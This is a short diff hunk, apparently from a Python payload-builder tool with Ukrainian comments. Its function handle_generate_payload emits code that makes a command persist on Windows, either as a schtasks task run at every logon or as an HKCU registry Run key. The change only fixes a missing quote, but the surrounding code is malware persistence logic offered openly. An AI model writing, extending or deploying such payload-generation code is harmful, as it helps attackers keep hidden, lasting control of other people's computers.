@@ -1210,7 +1210,7 @@ def handle_generate_payload():
             "            if method == 'scheduled_task':",
             # Використовуємо schtasks.exe. Потрібні права адміністратора для /rl HIGHEST. /sc ONLOGON - при вході будь-якого користувача.
             # /f - примусово створити, якщо вже існує.
-            "                persist_cmd_parts = ['schtasks', '/create', '/tn', name, '/tr', command, '/sc', 'ONLOGON', '/f'] # /rl', 'HIGHEST' - може вимагати адміна
+            "                persist_cmd_parts = ['schtasks', '/create', '/tn', name, '/tr', command, '/sc', 'ONLOGON', '/f'] # /rl', 'HIGHEST' - може вимагати адміна",
             "                success_msg = f\"Заплановане завдання '{{name}}' для команди '{{command}}' (начебто) створено.\"",
             "            elif method == 'registry_run_key':",
             # Використовуємо reg.exe для додавання ключа в HKCU (не вимагає адміна)
